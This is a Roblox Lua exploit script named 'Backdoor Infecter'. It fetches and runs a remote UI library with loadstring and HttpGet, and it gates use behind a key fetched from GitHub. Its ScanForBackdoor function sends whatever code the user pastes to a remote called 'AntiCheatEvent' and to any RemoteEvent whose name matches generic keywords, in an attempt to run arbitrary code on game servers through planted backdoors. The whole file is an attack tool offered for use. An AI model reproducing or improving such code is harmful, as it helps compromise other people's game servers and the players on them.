local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()

local Window = Rayfield:CreateWindow({
   Name = "Backdoor Infecter",
   Icon = 0,
   LoadingTitle = "Loading...",
   LoadingSubtitle = "by DevBar",
   ShowText = "Rayfield",
   Theme = "Default",

   ToggleUIKeybind = "K",

   DisableRayfieldPrompts = false,
   DisableBuildWarnings = false,

   ConfigurationSaving = {
      Enabled = true,
      FolderName = "Backdoor Infecter",
      FileName = "ConfigurationSaving"
   },

   Discord = {
      Enabled = true,
      Invite = "8TdJvXtrgv",
      RememberJoins = true
   },

   KeySystem = true,
   KeySettings = {
      Title = "Oops | Backdoor Infecter",
      Subtitle = "Key System",
      Note = "Check the Github or the Discord for find the key",
      FileName = "Backdoor Infecter Key",
      SaveKey = true,
      GrabKeyFromSite = true,
      Key = {"https://raw.githubusercontent.com/DevBarHub/Backdoor-Infecter-Script/refs/heads/main/keys.txt", "https://raw.githubusercontent.com/DevBarHub/Backdoor-Infecter-Script/refs/heads/main/key2.txt"}
   }
})

local MainTab = Window:CreateTab("Backdoor", "bug-play")
local Scripts = Window:CreateTab("Scripts", "file-code")

local Executor = MainTab:CreateSection("Executor")
local Require = Scripts:CreateSection("Require")

local function ScanForBackdoor(code)
    local ReplicatedStorage = game:GetService("ReplicatedStorage")
    local specificRemote = ReplicatedStorage:FindFirstChild("AntiCheatEvent")
    
    if specificRemote and specificRemote:IsA("RemoteEvent") then
        specificRemote:FireServer(code)
        return true
    end

    local found = false
    for _, obj in pairs(game:GetDescendants()) do
        if obj:IsA("RemoteEvent") then
            local name = obj.Name:lower()
            if name:find("cheat") or name:find("remote") or name:find("event") or name:find("server") then
                obj:FireServer(code)
                found = true
            end
        end
    end
    return found
end

local Input = MainTab:CreateInput({
   Name = "Executor",
   CurrentValue = "",
   PlaceholderText = "Put The Script (Copy and Paste is better in pc)",
   RemoveTextAfterFocusLost = false,
   Flag = "Input1",
   Callback = function(Text)
        ScanForBackdoor(Text)
   end,
})
